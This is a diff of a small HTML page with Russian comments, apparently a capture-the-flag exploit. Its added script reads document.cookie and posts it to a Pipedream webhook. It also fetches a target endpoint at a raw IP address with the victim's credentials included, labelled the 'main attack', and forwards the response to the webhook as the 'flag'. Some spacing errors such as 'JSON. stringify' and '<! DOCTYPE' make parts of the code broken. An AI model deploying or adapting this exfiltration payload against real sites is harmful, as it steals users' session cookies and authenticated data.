@@ -1,10 +1,32 @@
-<!DOCTYPE html>
+<! DOCTYPE html>
 <html>
 <body>
     <script>
-        // Просто отправляем 123 на webhook
-        fetch('https://eoeoea6xkzl1fz8.m.pipedream.net? data=123');
+        const ENDPOINT = 'https://ВАШ-ID.x.pipedream.net';
+        
+        // GET запрос
+        fetch(ENDPOINT + '?step=1&test=123');
+        
+        // POST запрос с JSON
+        fetch(ENDPOINT, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON. stringify({
+                flag: 'test_data',
+                cookies: document.cookie
+            })
+        });
+        
+        // Основная атака
+        fetch('http://158.160.184.159:13002/kraang/brain', {
+            credentials: 'include'
+        })
+        .then(r => r.text())
+        .then(data => {
+            // Отправляем флаг на RequestBin
+            fetch(ENDPOINT + '?flag=' + encodeURIComponent(data));
+        });
     </script>
-    <p>v12 </p>
+    <p>Loading...  v13</p>
 </body>
 </html>
